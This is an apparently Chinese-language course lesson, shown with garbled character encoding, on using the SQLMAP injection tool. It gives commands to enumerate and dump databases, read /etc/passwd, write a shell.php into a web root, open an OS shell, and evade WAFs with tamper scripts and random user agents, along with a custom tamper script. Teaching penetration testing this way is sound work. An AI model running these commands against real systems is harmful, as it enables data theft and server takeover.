# SQLæ³¨å…¥å·¥å…·è¯¦è§£ï¼šSQLMAPå®æˆ˜æŒ‡å— ğŸ› ï¸

åœ¨æœ¬èŠ‚è¯¾ä¸­ï¼Œæˆ‘ä»¬å°†æ·±å…¥å­¦ä¹ ä¸€æ¬¾å¼ºå¤§çš„SQLæ³¨å…¥è‡ªåŠ¨åŒ–å·¥å…·â€”â€”SQLMAPã€‚æˆ‘ä»¬å°†ä»åŸºç¡€ä½¿ç”¨è®²èµ·ï¼Œæ¶µç›–å…¶æ ¸å¿ƒåŠŸèƒ½ã€é«˜çº§å‚æ•°ã€ç»•è¿‡æŠ€å·§ä»¥åŠè„šæœ¬ç¼–å†™ï¼Œå¸®åŠ©ä½ å…¨é¢æŒæ¡è¿™ä¸ªå·¥å…·ï¼Œä»è€Œåœ¨é¢å¯¹SQLæ³¨å…¥æ¼æ´æ—¶èƒ½å¤Ÿçµæ´»é«˜æ•ˆåœ°è¿›è¡Œåˆ©ç”¨ã€‚

![](img/2b96891e8636c95c08fae08a91f877bb_1.png)

![](img/2b96891e8636c95c08fae08a91f877bb_3.png)

![](img/2b96891e8636c95c08fae08a91f877bb_5.png)

## è®¤è¯†SQLMAP ğŸ§

![](img/2b96891e8636c95c08fae08a91f877bb_7.png)

![](img/2b96891e8636c95c08fae08a91f877bb_9.png)

![](img/2b96891e8636c95c08fae08a91f877bb_11.png)

SQLMAPæ˜¯ä¸€æ¬¾å¼€æºçš„è‡ªåŠ¨åŒ–SQLæ³¨å…¥å·¥å…·ï¼Œä¸“é—¨ç”¨äºæ£€æµ‹å’Œåˆ©ç”¨SQLæ³¨å…¥æ¼æ´ã€‚å®ƒæ”¯æŒå¤šç§æ•°æ®åº“ï¼ˆå¦‚MySQLã€Oracleã€PostgreSQLã€Microsoft SQL Serverã€Accessç­‰ï¼‰å’Œå¤šç§æ³¨å…¥ç±»å‹ï¼ˆå¦‚è”åˆæŸ¥è¯¢ã€å¸ƒå°”ç›²æ³¨ã€æ—¶é—´ç›²æ³¨ã€æŠ¥é”™æ³¨å…¥ã€å †å æŸ¥è¯¢ï¼‰ã€‚

![](img/2b96891e8636c95c08fae08a91f877bb_13.png)

![](img/2b96891e8636c95c08fae08a91f877bb_15.png)

**æ ¸å¿ƒä¼˜åŠ¿**ï¼šèƒ½å¤Ÿè‡ªåŠ¨è¯†åˆ«æ•°æ®åº“ç±»å‹ã€æ³¨å…¥ç‚¹ï¼Œå¹¶æ‰§è¡Œæ•°æ®æå–ã€æ–‡ä»¶è¯»å†™ã€å‘½ä»¤æ‰§è¡Œç­‰é«˜æƒé™æ“ä½œã€‚

![](img/2b96891e8636c95c08fae08a91f877bb_17.png)

## åŸºç¡€ä½¿ç”¨ï¼šä»ç®€å•æ³¨å…¥å¼€å§‹ ğŸš€

![](img/2b96891e8636c95c08fae08a91f877bb_19.png)

![](img/2b96891e8636c95c08fae08a91f877bb_21.png)

ä¸Šä¸€èŠ‚æˆ‘ä»¬ä»‹ç»äº†SQLMAPçš„åŸºæœ¬æ¦‚å¿µï¼Œæœ¬èŠ‚ä¸­æˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•ä½¿ç”¨å®ƒè¿›è¡ŒåŸºç¡€çš„æ³¨å…¥æµ‹è¯•ã€‚

![](img/2b96891e8636c95c08fae08a91f877bb_23.png)

![](img/2b96891e8636c95c08fae08a91f877bb_25.png)

![](img/2b96891e8636c95c08fae08a91f877bb_27.png)

![](img/2b96891e8636c95c08fae08a91f877bb_29.png)

![](img/2b96891e8636c95c08fae08a91f877bb_31.png)

![](img/2b96891e8636c95c08fae08a91f877bb_33.png)

![](img/2b96891e8636c95c08fae08a91f877bb_35.png)

### ç¯å¢ƒå‡†å¤‡ä¸åŸºæœ¬å‘½ä»¤

![](img/2b96891e8636c95c08fae08a91f877bb_37.png)

![](img/2b96891e8636c95c08fae08a91f877bb_39.png)

![](img/2b96891e8636c95c08fae08a91f877bb_41.png)

![](img/2b96891e8636c95c08fae08a91f877bb_43.png)

ä½¿ç”¨SQLMAPå‰ï¼Œéœ€è¦å‡†å¤‡å¥½Pythonç¯å¢ƒï¼ˆPython 2æˆ–3å‡å¯ï¼‰ã€‚åŸºæœ¬æ£€æµ‹å‘½ä»¤å¦‚ä¸‹ï¼š

![](img/2b96891e8636c95c08fae08a91f877bb_45.png)

![](img/2b96891e8636c95c08fae08a91f877bb_47.png)

![](img/2b96891e8636c95c08fae08a91f877bb_49.png)

![](img/2b96891e8636c95c08fae08a91f877bb_51.png)

```bash
python sqlmap.py -u "http://target.com/page.php?id=1"
```

![](img/2b96891e8636c95c08fae08a91f877bb_53.png)

![](img/2b96891e8636c95c08fae08a91f877bb_55.png)

![](img/2b96891e8636c95c08fae08a91f877bb_57.png)

**å‚æ•°è§£é‡Š**ï¼š
*   `-u`ï¼šæŒ‡å®šç›®æ ‡URLã€‚

![](img/2b96891e8636c95c08fae08a91f877bb_59.png)

![](img/2b96891e8636c95c08fae08a91f877bb_61.png)

æ‰§è¡Œåï¼ŒSQLMAPä¼šå°è¯•æ£€æµ‹è¯¥å‚æ•°æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼Œå¹¶åœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªä»¥ç›®æ ‡åŸŸåä¸ºåçš„æ–‡ä»¶å¤¹ï¼Œç”¨äºä¿å­˜æ³¨å…¥è¿‡ç¨‹ä¸­çš„æ—¥å¿—å’Œæ•°æ®ã€‚

![](img/2b96891e8636c95c08fae08a91f877bb_63.png)

![](img/2b96891e8636c95c08fae08a91f877bb_65.png)

### é’ˆå¯¹ä¸åŒæ•°æ®åº“çš„æ³¨å…¥æµç¨‹

SQLMAPä¼šæ ¹æ®æ£€æµ‹åˆ°çš„æ•°æ®åº“ç±»å‹è‡ªåŠ¨è°ƒæ•´æ”»å‡»è½½è·ã€‚ä»¥ä¸‹æ˜¯é’ˆå¯¹ä¸¤ç§å¸¸è§æ•°æ®åº“çš„æµç¨‹å·®å¼‚ï¼š

![](img/2b96891e8636c95c08fae08a91f877bb_67.png)

![](img/2b96891e8636c95c08fae08a91f877bb_69.png)

**Accessæ•°æ®åº“**ï¼š
Accessæ•°æ®åº“æ²¡æœ‰ç³»ç»Ÿè¡¨ï¼ˆå¦‚`information_schema`ï¼‰ï¼Œå› æ­¤éœ€è¦é€šè¿‡å­—å…¸æš´åŠ›çŒœè§£è¡¨åå’Œåˆ—åã€‚
1.  æ£€æµ‹æ³¨å…¥ç‚¹ã€‚
2.  ä½¿ç”¨ `--tables` å‚æ•°çŒœè§£è¡¨åï¼ˆä¾èµ–äº `data/txt/common-tables.txt` å­—å…¸ï¼‰ã€‚
3.  ä½¿ç”¨ `--columns -T è¡¨å` å‚æ•°çŒœè§£æŒ‡å®šè¡¨çš„åˆ—åã€‚
4.  ä½¿ç”¨ `--dump -T è¡¨å -C åˆ—å1,åˆ—å2` å‚æ•°å¯¼å‡ºæŒ‡å®šåˆ—çš„æ•°æ®ã€‚

![](img/2b96891e8636c95c08fae08a91f877bb_71.png)

![](img/2b96891e8636c95c08fae08a91f877bb_73.png)

![](img/2b96891e8636c95c08fae08a91f877bb_75.png)

![](img/2b96891e8636c95c08fae08a91f877bb_77.png)

**MySQLæ•°æ®åº“**ï¼š
MySQLç­‰æ•°æ®åº“æœ‰ç³»ç»Ÿè¡¨ï¼Œå¯ä»¥æŸ¥è¯¢åº“ã€è¡¨ã€åˆ—ä¿¡æ¯ï¼Œæµç¨‹ç•¥æœ‰ä¸åŒã€‚
1.  æ£€æµ‹æ³¨å…¥ç‚¹ã€‚
2.  ä½¿ç”¨ `--current-db` å‚æ•°è·å–å½“å‰æ•°æ®åº“åã€‚
3.  ä½¿ç”¨ `--tables -D æ•°æ®åº“å` å‚æ•°è·å–æŒ‡å®šæ•°æ®åº“çš„æ‰€æœ‰è¡¨ã€‚
4.  ä½¿ç”¨ `--columns -T è¡¨å -D æ•°æ®åº“å` å‚æ•°è·å–æŒ‡å®šè¡¨çš„åˆ—ã€‚
5.  ä½¿ç”¨ `--dump -T è¡¨å -D æ•°æ®åº“å -C åˆ—å1,åˆ—å2` å‚æ•°å¯¼å‡ºæ•°æ®ã€‚

![](img/2b96891e8636c95c08fae08a91f877bb_79.png)

![](img/2b96891e8636c95c08fae08a91f877bb_81.png)

## é«˜æƒé™æ“ä½œä¸è¿›é˜¶åˆ©ç”¨ âš¡

![](img/2b96891e8636c95c08fae08a91f877bb_83.png)

![](img/2b96891e8636c95c08fae08a91f877bb_85.png)

![](img/2b96891e8636c95c08fae08a91f877bb_87.png)

![](img/2b96891e8636c95c08fae08a91f877bb_88.png)

![](img/2b96891e8636c95c08fae08a91f877bb_90.png)

![](img/2b96891e8636c95c08fae08a91f877bb_92.png)

åœ¨ç¡®è®¤æ³¨å…¥ç‚¹åï¼Œåˆ¤æ–­å½“å‰æ•°æ®åº“ç”¨æˆ·çš„æƒé™è‡³å…³é‡è¦ï¼Œè¿™å†³å®šäº†æˆ‘ä»¬èƒ½å¦è¿›è¡Œæ›´æ·±å±‚æ¬¡çš„åˆ©ç”¨ã€‚

![](img/2b96891e8636c95c08fae08a91f877bb_94.png)

![](img/2b96891e8636c95c08fae08a91f877bb_96.png)

### æƒé™åˆ¤æ–­

![](img/2b96891e8636c95c08fae08a91f877bb_98.png)

![](img/2b96891e8636c95c08fae08a91f877bb_100.png)

ä½¿ç”¨ `--is-dba` å‚æ•°å¯ä»¥åˆ¤æ–­å½“å‰æ•°æ®åº“ç”¨æˆ·æ˜¯å¦ä¸ºé«˜æƒé™ç”¨æˆ·ï¼ˆå¦‚DBAã€rootï¼‰ã€‚

![](img/2b96891e8636c95c08fae08a91f877bb_102.png)

![](img/2b96891e8636c95c08fae08a91f877bb_104.png)

![](img/2b96891e8636c95c08fae08a91f877bb_106.png)

![](img/2b96891e8636c95c08fae08a91f877bb_108.png)

```bash
python sqlmap.py -u "http://target.com/page.php?id=1" --is-dba
```
å¦‚æœè¿”å› `True`ï¼Œåˆ™æ„å‘³ç€æˆ‘ä»¬æ‹¥æœ‰é«˜æƒé™ï¼Œå¯ä»¥è¿›è¡Œæ–‡ä»¶è¯»å†™ã€å‘½ä»¤æ‰§è¡Œç­‰æ“ä½œã€‚

![](img/2b96891e8636c95c08fae08a91f877bb_110.png)

![](img/2b96891e8636c95c08fae08a91f877bb_112.png)

![](img/2b96891e8636c95c08fae08a91f877bb_114.png)

![](img/2b96891e8636c95c08fae08a91f877bb_116.png)

![](img/2b96891e8636c95c08fae08a91f877bb_118.png)

### é«˜æƒé™ä¸‹çš„é«˜çº§æ“ä½œ

![](img/2b96891e8636c95c08fae08a91f877bb_120.png)

![](img/2b96891e8636c95c08fae08a91f877bb_122.png)

![](img/2b96891e8636c95c08fae08a91f877bb_124.png)

![](img/2b96891e8636c95c08fae08a91f877bb_126.png)

ä»¥ä¸‹æ˜¯é«˜æƒé™ç”¨æˆ·å¯èƒ½æ‰§è¡Œçš„ä¸€äº›æ“ä½œï¼š

![](img/2b96891e8636c95c08fae08a91f877bb_128.png)

![](img/2b96891e8636c95c08fae08a91f877bb_130.png)

**æ‰§è¡Œä»»æ„SQLè¯­å¥**ï¼š
```bash
python sqlmap.py -u "http://target.com/page.php?id=1" --sql-shell
```
åœ¨äº¤äº’å¼SQL shellä¸­ç›´æ¥æ‰§è¡ŒSQLå‘½ä»¤ã€‚

**æ–‡ä»¶è¯»å–**ï¼š
```bash
python sqlmap.py -u "http://target.com/page.php?id=1" --file-read "/etc/passwd"
```
è¯»å–æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶å†…å®¹ã€‚

![](img/2b96891e8636c95c08fae08a91f877bb_132.png)

![](img/2b96891e8636c95c08fae08a91f877bb_134.png)

![](img/2b96891e8636c95c08fae08a91f877bb_136.png)

**æ–‡ä»¶å†™å…¥**ï¼š
```bash
python sqlmap.py -u "http://target.com/page.php?id=1" --file-write "/local/path/to/shell.php" --file-dest "/var/www/html/shell.php"
```
å°†æœ¬åœ°æ–‡ä»¶å†™å…¥åˆ°æœåŠ¡å™¨æŒ‡å®šè·¯å¾„ï¼ˆéœ€æœ‰å†™æƒé™ï¼‰ã€‚

![](img/2b96891e8636c95c08fae08a91f877bb_138.png)

![](img/2b96891e8636c95c08fae08a91f877bb_140.png)

![](img/2b96891e8636c95c08fae08a91f877bb_142.png)

**æ“ä½œç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ**ï¼š
```bash
python sqlmap.py -u "http://target.com/page.php?id=1" --os-shell
```
è·å–ä¸€ä¸ªäº¤äº’å¼çš„æ“ä½œç³»ç»Ÿshellï¼Œæˆ–è€…ä½¿ç”¨ `--os-cmd` æ‰§è¡Œå•æ¡å‘½ä»¤ã€‚

![](img/2b96891e8636c95c08fae08a91f877bb_144.png)

![](img/2b96891e8636c95c08fae08a91f877bb_146.png)

> **æ³¨æ„**ï¼šæ–‡ä»¶è¯»å†™å’Œå‘½ä»¤æ‰§è¡ŒåŠŸèƒ½ä¸¥é‡ä¾èµ–äºæ•°æ®åº“é…ç½®å’Œæƒé™ï¼ˆä¾‹å¦‚MySQLçš„ `secure_file_priv` è®¾ç½®ï¼‰ï¼Œå¹¶éæ‰€æœ‰é«˜æƒé™æ³¨å…¥ç‚¹éƒ½èƒ½æˆåŠŸã€‚

![](img/2b96891e8636c95c08fae08a91f877bb_148.png)

![](img/2b96891e8636c95c08fae08a91f877bb_150.png)

## å¤„ç†å„ç§è¯·æ±‚ç±»å‹ä¸æ•°æ®åŒ… ğŸ”„

![](img/2b96891e8636c95c08fae08a91f877bb_152.png)

![](img/2b96891e8636c95c08fae08a91f877bb_154.png)

å®é™…æ¸—é€ä¸­ï¼Œæ³¨å…¥ç‚¹å¯èƒ½å‡ºç°åœ¨GETã€POSTã€Cookieã€HTTPå¤´ç­‰ä¸åŒä½ç½®ã€‚SQLMAPæä¾›äº†ç›¸åº”çš„å‚æ•°æ¥å¤„ç†ã€‚

![](img/2b96891e8636c95c08fae08a91f877bb_156.png)

![](img/2b96891e8636c95c08fae08a91f877bb_158.png)

![](img/2b96891e8636c95c08fae08a91f877bb_160.png)

### POSTæ³¨å…¥

![](img/2b96891e8636c95c08fae08a91f877bb_162.png)

![](img/2b96891e8636c95c08fae08a91f877bb_164.png)

å½“æ³¨å…¥ç‚¹åœ¨POSTè¯·æ±‚ä½“ä¸­æ—¶ï¼Œä½¿ç”¨ `--data` å‚æ•°ã€‚
```bash
python sqlmap.py -u "http://target.com/login.php" --data="username=admin&password=pass"
```

![](img/2b96891e8636c95c08fae08a91f877bb_166.png)

![](img/2b96891e8636c95c08fae08a91f877bb_168.png)

![](img/2b96891e8636c95c08fae08a91f877bb_170.png)

### Cookieæ³¨å…¥

å½“æ³¨å…¥ç‚¹åœ¨Cookieä¸­æ—¶ï¼Œä½¿ç”¨ `--cookie` å‚æ•°ã€‚
```bash
python sqlmap.py -u "http://target.com/index.php" --cookie="sessionid=abc123; user=test"
```

![](img/2b96891e8636c95c08fae08a91f877bb_172.png)

### ä½¿ç”¨åŸå§‹HTTPæ•°æ®åŒ…ï¼ˆæ¨èï¼‰

![](img/2b96891e8636c95c08fae08a91f877bb_174.png)

![](img/2b96891e8636c95c08fae08a91f877bb_176.png)

![](img/2b96891e8636c95c08fae08a91f877bb_178.png)

å¯¹äºå¤æ‚çš„è¯·æ±‚ï¼ˆå¦‚JSONæ ¼å¼ã€è‡ªå®šä¹‰å¤´éƒ¨ï¼‰ï¼Œæœ€å¯é çš„æ–¹å¼æ˜¯ä½¿ç”¨ `-r` å‚æ•°åŠ è½½ä¸€ä¸ªå®Œæ•´çš„HTTPè¯·æ±‚æ–‡ä»¶ï¼Œå¹¶åœ¨æ³¨å…¥ç‚¹ä½ç½®ç”¨ `*` æ ‡è®°ã€‚
1.  ä½¿ç”¨Burp Suiteç­‰å·¥å…·æŠ“å–æ•°æ®åŒ…ï¼Œä¿å­˜ä¸º `request.txt`ã€‚
2.  åœ¨å‚æ•°å€¼å¤„ç”¨ `*` æ ‡è®°ï¼Œä¾‹å¦‚ `{"username":"*admin*", "password":"test"}`ã€‚
3.  æ‰§è¡Œå‘½ä»¤ï¼š
    ```bash
    python sqlmap.py -r request.txt
    ```
è¿™ç§æ–¹æ³•èƒ½æœ€å¤§ç¨‹åº¦ä¿æŒè¯·æ±‚çš„åŸå§‹æ€§ï¼Œé¿å…å› è¯·æ±‚å¤´ç¼ºå¤±æˆ–æ ¼å¼é”™è¯¯å¯¼è‡´æ£€æµ‹å¤±è´¥ã€‚

![](img/2b96891e8636c95c08fae08a91f877bb_180.png)

![](img/2b96891e8636c95c08fae08a91f877bb_182.png)

![](img/2b96891e8636c95c08fae08a91f877bb_184.png)

## Tamperè„šæœ¬ï¼šç»•è¿‡è¿‡æ»¤ä¸WAF ğŸ›¡ï¸â¡ï¸ğŸšª

![](img/2b96891e8636c95c08fae08a91f877bb_186.png)

ç½‘ç«™é€šå¸¸ä¼šéƒ¨ç½²WAFæˆ–ç¼–å†™è¿‡æ»¤ä»£ç æ¥é˜²å¾¡SQLæ³¨å…¥ã€‚SQLMAPçš„Tamperè„šæœ¬å¯ä»¥å¯¹æ³¨å…¥è½½è·è¿›è¡Œæ··æ·†ã€ç¼–ç ï¼Œä»¥ç»•è¿‡è¿™äº›é˜²æŠ¤ã€‚

![](img/2b96891e8636c95c08fae08a91f877bb_188.png)

![](img/2b96891e8636c95c08fae08a91f877bb_190.png)

![](img/2b96891e8636c95c08fae08a91f877bb_192.png)

![](img/2b96891e8636c95c08fae08a91f877bb_194.png)

### ä½¿ç”¨å†…ç½®Tamperè„šæœ¬

![](img/2b96891e8636c95c08fae08a91f877bb_196.png)

SQLMAPå†…ç½®äº†è®¸å¤šTamperè„šæœ¬ï¼Œä½äº `tamper/` ç›®å½•ä¸‹ã€‚ä¾‹å¦‚ï¼Œç»•è¿‡åŸºç¡€è¿‡æ»¤çš„ `space2comment`ï¼Œæˆ–è¿›è¡ŒBase64ç¼–ç çš„ `base64encode`ã€‚
```bash
python sqlmap.py -u "http://target.com/page.php?id=1" --tamper=base64encode,space2comment
```

![](img/2b96891e8636c95c08fae08a91f877bb_198.png)

![](img/2b96891e8636c95c08fae08a91f877bb_200.png)

### ç¼–å†™è‡ªå®šä¹‰Tamperè„šæœ¬

![](img/2b96891e8636c95c08fae08a91f877bb_202.png)

![](img/2b96891e8636c95c08fae08a91f877bb_204.png)

![](img/2b96891e8636c95c08fae08a91f877bb_206.png)

![](img/2b96891e8636c95c08fae08a91f877bb_208.png)

![](img/2b96891e8636c95c08fae08a91f877bb_210.png)

å½“å†…ç½®è„šæœ¬æ— æ³•ç»•è¿‡æ—¶ï¼Œéœ€è¦è‡ªå·±ç¼–å†™ã€‚Tamperè„šæœ¬æœ¬è´¨æ˜¯ä¸€ä¸ªPythonæ–‡ä»¶ï¼Œæ ¸å¿ƒæ˜¯ `tamper(payload, **kwargs)` å‡½æ•°ï¼Œå¯¹è¾“å…¥çš„ `payload` è¿›è¡Œå˜æ¢å¹¶è¿”å›ã€‚

ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ï¼Œå°† `UNION` è½¬æ¢ä¸ºå¤§å°å†™æ··åˆ `UnIoN` ä»¥ç»•è¿‡ç®€å•çš„å…³é”®å­—è¿‡æ»¤ï¼š
```python
#!/usr/bin/env python
"""
è‡ªå®šä¹‰Tamperè„šæœ¬ï¼šå°†SQLå…³é”®å­—è½¬æ¢ä¸ºå¤§å°å†™æ··åˆ
"""

![](img/2b96891e8636c95c08fae08a91f877bb_212.png)

![](img/2b96891e8636c95c08fae08a91f877bb_214.png)

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

![](img/2b96891e8636c95c08fae08a91f877bb_216.png)

![](img/2b96891e8636c95c08fae08a91f877bb_218.png)

![](img/2b96891e8636c95c08fae08a91f877bb_220.png)

def tamper(payload, **kwargs):
    retVal = payload
    if payload:
        # æ›¿æ¢å…³é”®å­—ä¸ºå¤§å°å†™æ··åˆå˜ä½“
        retVal = retVal.replace('UNION', 'UnIoN')
        retVal = retVal.replace('SELECT', 'SeLeCt')
        retVal = retVal.replace('OR', 'Or')
        retVal = retVal.replace('AND', 'AnD')
    return retVal
```
å°†è„šæœ¬ä¿å­˜ä¸º `mytamper.py` æ”¾å…¥ `tamper/` ç›®å½•ï¼Œä½¿ç”¨ `--tamper=mytamper` è°ƒç”¨ã€‚

![](img/2b96891e8636c95c08fae08a91f877bb_222.png)

![](img/2b96891e8636c95c08fae08a91f877bb_224.png)

![](img/2b96891e8636c95c08fae08a91f877bb_226.png)

**æ ¸å¿ƒéš¾ç‚¹**ï¼šTamperè„šæœ¬çš„ç¼–å†™ä¾èµ–äºå¯¹ç›®æ ‡é˜²æŠ¤è§„åˆ™çš„ç²¾ç¡®åˆ†æï¼ˆé»‘ç›’æˆ–ç™½ç›’æµ‹è¯•ï¼‰ï¼Œéš¾ç‚¹åœ¨äºâ€œå‘ç°ç»•è¿‡æ–¹æ³•â€ï¼Œè€Œéâ€œç¼–å†™ä»£ç æœ¬èº«â€ã€‚

![](img/2b96891e8636c95c08fae08a91f877bb_228.png)

![](img/2b96891e8636c95c08fae08a91f877bb_230.png)

![](img/2b96891e8636c95c08fae08a91f877bb_232.png)

![](img/2b96891e8636c95c08fae08a91f877bb_234.png)

## å®ç”¨å‚æ•°ä¸è°ƒè¯•æŠ€å·§ ğŸ

![](img/2b96891e8636c95c08fae08a91f877bb_235.png)

![](img/2b96891e8636c95c08fae08a91f877bb_236.png)

![](img/2b96891e8636c95c08fae08a91f877bb_238.png)

![](img/2b96891e8636c95c08fae08a91f877bb_240.png)

![](img/2b96891e8636c95c08fae08a91f877bb_242.png)

ä¸ºäº†æ›´æœ‰æ•ˆåœ°ä½¿ç”¨SQLMAPï¼Œä»¥ä¸‹æ˜¯ä¸€äº›å…³é”®å‚æ•°å’Œè°ƒè¯•æ–¹æ³•ã€‚

![](img/2b96891e8636c95c08fae08a91f877bb_244.png)

![](img/2b96891e8636c95c08fae08a91f877bb_246.png)

![](img/2b96891e8636c95c08fae08a91f877bb_248.png)

![](img/2b96891e8636c95c08fae08a91f877bb_250.png)

![](img/2b96891e8636c95c08fae08a91f877bb_252.png)

### å¸¸ç”¨å‚æ•°

![](img/2b96891e8636c95c08fae08a91f877bb_254.png)

![](img/2b96891e8636c95c08fae08a91f877bb_256.png)

ä»¥ä¸‹æ˜¯å‡ ä¸ªæé«˜æµ‹è¯•æ•ˆç‡å’ŒæˆåŠŸç‡çš„å‚æ•°ï¼š

![](img/2b96891e8636c95c08fae08a91f877bb_258.png)

![](img/2b96891e8636c95c08fae08a91f877bb_260.png)

![](img/2b96891e8636c95c08fae08a91f877bb_262.png)

![](img/2b96891e8636c95c08fae08a91f877bb_264.png)

![](img/2b96891e8636c95c08fae08a91f877bb_266.png)

![](img/2b96891e8636c95c08fae08a91f877bb_268.png)

**è®¾ç½®å»¶è¿Ÿ**ï¼šé˜²æ­¢å› è¯·æ±‚è¿‡å¿«è¢«å±è”½ã€‚
```bash
python sqlmap.py -u "http://target.com/page.php?id=1" --delay=2
```

![](img/2b96891e8636c95c08fae08a91f877bb_270.png)

![](img/2b96891e8636c95c08fae08a91f877bb_272.png)

![](img/2b96891e8636c95c08fae08a91f877bb_274.png)

**ä¿®æ”¹User-Agent**ï¼šé¿å…è¢«WAFé€šè¿‡å·¥å…·æŒ‡çº¹è¯†åˆ«ã€‚
```bash
python sqlmap.py -u "http://target.com/page.php?id=1" --random-agent
# æˆ–è‡ªå®šä¹‰
python sqlmap.py -u "http://target.com/page.php?id=1" --user-agent="Mozilla/5.0..."
```

![](img/2b96891e8636c95c08fae08a91f877bb_276.png)

![](img/2b96891e8636c95c08fae08a91f877bb_278.png)

**ä½¿ç”¨ä»£ç†**ï¼šæ–¹ä¾¿é€šè¿‡Burp Suiteç­‰å·¥å…·è§‚å¯Ÿæµé‡ï¼Œæˆ–ä½¿ç”¨ä»£ç†æ± ã€‚
```bash
python sqlmap.py -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"
```

![](img/2b96891e8636c95c08fae08a91f877bb_280.png)

![](img/2b96891e8636c95c08fae08a91f877bb_282.png)

![](img/2b96891e8636c95c08fae08a91f877bb_284.png)

![](img/2b96891e8636c95c08fae08a91f877bb_286.png)

![](img/2b96891e8636c95c08fae08a91f877bb_288.png)

**æµ‹è¯•ç­‰çº§ä¸é£é™©ç­‰çº§**ï¼š
*   `--level` (1-5)ï¼šæµ‹è¯•çš„æ·±å…¥ç¨‹åº¦ï¼Œç­‰çº§è¶Šé«˜ï¼Œæµ‹è¯•çš„Payloadå’Œå‚æ•°è¶Šå¤šï¼ˆä¾‹å¦‚ä¼šæµ‹è¯•HTTPå¤´ï¼‰ã€‚
*   `--risk` (1-3)ï¼šæµ‹è¯•çš„é£é™©ç¨‹åº¦ï¼Œé£é™©è¶Šé«˜ï¼Œä½¿ç”¨çš„Payloadå¯èƒ½å¯¹æ•°æ®é€ æˆç ´åï¼ˆå¦‚`OR 1=1`ï¼‰çš„å¯èƒ½æ€§è¶Šå¤§ã€‚
    åœ¨å¸¸è§„æ£€æµ‹å¤±è´¥æ—¶ï¼Œå¯ä»¥å°è¯•æé«˜ç­‰çº§ã€‚
    ```bash
    python sqlmap.py -u "http://target.com/page.php?id=1" --level=3 --risk=2
    ```

![](img/2b96891e8636c95c08fae08a91f877bb_290.png)

![](img/2b96891e8636c95c08fae08a91f877bb_292.png)

![](img/2b96891e8636c95c08fae08a91f877bb_294.png)

![](img/2b96891e8636c95c08fae08a91f877bb_296.png)

![](img/2b96891e8636c95c08fae08a91f877bb_298.png)

### è°ƒè¯•ä¸ä¿¡æ¯è·å–

![](img/2b96891e8636c95c08fae08a91f877bb_300.png)

![](img/2b96891e8636c95c08fae08a91f877bb_302.png)

![](img/2b96891e8636c95c08fae08a91f877bb_304.png)

![](img/2b96891e8636c95c08fae08a91f877bb_306.png)

![](img/2b96891e8636c95c08fae08a91f877bb_308.png)

![](img/2b96891e8636c95c08fae08a91f877bb_310.png)

![](img/2b96891e8636c95c08fae08a91f877bb_312.png)

![](img/2b96891e8636c95c08fae08a91f877bb_314.png)

**è¯¦ç»†è¾“å‡º**ï¼šä½¿ç”¨ `-v` å‚æ•°å¯ä»¥æ§åˆ¶è¾“å‡ºä¿¡æ¯çš„è¯¦ç»†ç¨‹åº¦ï¼ˆ0-6ï¼‰ã€‚`-v 3` ä¼šæ˜¾ç¤ºæ³¨å…¥çš„Payloadï¼Œ`-v 4` ä¼šæ˜¾ç¤ºHTTPè¯·æ±‚ï¼Œ`-v 5` ä¼šæ˜¾ç¤ºHTTPå“åº”å¤´ï¼Œ`-v 6` ä¼šæ˜¾ç¤ºHTTPå“åº”é¡µé¢å†…å®¹ã€‚è¿™å¯¹äºåˆ†ææ³¨å…¥å¤±è´¥åŸå› è‡³å…³é‡è¦ã€‚
```bash
python sqlmap.py -u "http://target.com/page.php?id=1" -v 3
```

![](img/2b96891e8636c95c08fae08a91f877bb_316.png)

![](img/2b96891e8636c95c08fae08a91f877bb_318.png)

![](img/2b96891e8636c95c08fae08a91f877bb_320.png)

**è·å–ç³»ç»Ÿä¿¡æ¯**ï¼š
```bash
python sqlmap.py -u "http://target.com/page.php?id=1" --banner # æ•°æ®åº“ç‰ˆæœ¬
python sqlmap.py -u "http://target.com/page.php?id=1" --current-user # å½“å‰ç”¨æˆ·
python sqlmap.py -u "http://target.com/page.php?id=1" --dbs # æ‰€æœ‰æ•°æ®åº“
```

![](img/2b96891e8636c95c08fae08a91f877bb_322.png)

![](img/2b96891e8636c95c08fae08a91f877bb_324.png)

![](img/2b96891e8636c95c08fae08a91f877bb_326.png)

![](img/2b96891e8636c95c08fae08a91f877bb_328.png)

![](img/2b96891e8636c95c08fae08a91f877bb_330.png)

## æ€»ç»“ ğŸ“š

![](img/2b96891e8636c95c08fae08a91f877bb_332.png)

![](img/2b96891e8636c95c08fae08a91f877bb_334.png)

![](img/2b96891e8636c95c08fae08a91f877bb_336.png)

æœ¬èŠ‚è¯¾æˆ‘ä»¬ä¸€èµ·æ·±å…¥å­¦ä¹ äº†SQLMAPè¿™æ¬¾å¼ºå¤§çš„SQLæ³¨å…¥å·¥å…·ã€‚æˆ‘ä»¬ä»æœ€åŸºç¡€çš„URLæ£€æµ‹å¼€å§‹ï¼Œé€æ­¥æŒæ¡äº†ï¼š

![](img/2b96891e8636c95c08fae08a91f877bb_338.png)

![](img/2b96891e8636c95c08fae08a91f877bb_340.png)

1.  **æ ¸å¿ƒä½¿ç”¨æµç¨‹**ï¼šé’ˆå¯¹Accesså’ŒMySQLç­‰ä¸åŒæ•°æ®åº“çš„è‡ªåŠ¨åŒ–æ³¨å…¥ä¸æ•°æ®æå–ã€‚
2.  **æƒé™æå‡åˆ©ç”¨**ï¼šå¦‚ä½•åˆ¤æ–­é«˜æƒé™æ³¨å…¥ç‚¹ï¼Œå¹¶åˆ©ç”¨å…¶è¿›è¡Œæ–‡ä»¶è¯»å†™ã€å‘½ä»¤æ‰§è¡Œç­‰é«˜çº§æ“ä½œã€‚
3.  **å¤æ‚è¯·æ±‚å¤„ç†**ï¼šç†Ÿç»ƒåº”å¯¹GETã€POSTã€Cookieã€JSONä»¥åŠé€šè¿‡åŸå§‹æ•°æ®åŒ…è¿›è¡Œæ³¨å…¥ã€‚
